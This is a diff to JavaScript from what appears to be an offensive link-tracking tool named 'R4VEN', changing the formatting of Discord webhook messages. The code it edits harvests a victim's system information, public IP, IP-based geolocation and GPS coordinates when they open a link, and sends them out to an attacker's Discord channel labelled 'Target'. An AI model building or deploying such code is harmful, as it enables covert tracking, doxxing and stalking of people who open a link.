@@ -32,12 +32,14 @@ const request = new XMLHttpRequest();
         name: "Someone Opened The Link !!"
       },
       title: "Target System Information..",
-      description: sysinfo
+      description: sysinfo,
+      color: 15418782
     }
 
     var params = {
       username: "R4VEN",
       avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1050532742707806288/vecteezy_cute-flat-illustration-cartoon-of-thief-hacker-stealing-data_14603389.jpg",
+      content: "@here",
       embeds: [ myEmbed ]
     }
 
@@ -57,8 +59,12 @@ $.getJSON("https://api.ipify.org?format=json", function(data) {
         author: {
           name: "Target Ip"
         },
-        description: '```xl\n' + data.ip + '```' + '\n__**IP Details:**__ https://ip-api.com/#' + data.ip  + "\n" +
-        '```diff\n- Geographic location based on IP address is NOT accurate, it provides the approximate location of the ISP' + '```'
+        description: '```xl\n' + data.ip + '```' + '\n__**IP Details:**__ https://ip-api.com/#' + data.ip  + "\n",
+        color: 15548997,
+
+        footer: {
+        text: "Geographic location based on IP address is NOT accurate, it provides the approximate location of the ISP."
+      }
       }
 
       var params = {
@@ -79,9 +85,9 @@ $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode
 
       var myEmbed = {
         author: {
-          name: "IP address:"
+          name: "IP Address Reconnaissance"
         },
-        title: response.query,
+        title: response.status, //response.query
         description: '```autohotkey\nContinent: ' + response.continent +
         "\nContinentCode: " + response.continentcode +
         "\nCountry: " + response.country +
@@ -101,7 +107,9 @@ $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode
         "\nProxy: " + response.proxy +
         "\nMobile: " + response.mobile +
         "\nLat: " + response.lat +
-        "\nLon: " + response.lon + '```'
+        "\nLon: " + response.lon + '```',
+        color: 5763719
+
       }
 
       var params = {
@@ -135,8 +143,11 @@ function showPosition(position) {
           name: "Target Allowed Location Permission"
         },
         title: "GPS location of target..",
-        description: latlong + "\n" +
-        '```diff\n+ GPS fetch almost exact location because it uses longitude and latitude coordinates.' + '```'
+        description: latlong + "\n",
+        color: 15844367,
+        footer: {
+        text: "GPS fetch almost exact location because it uses longitude and latitude coordinates."
+      }
       }
 
       var params = {
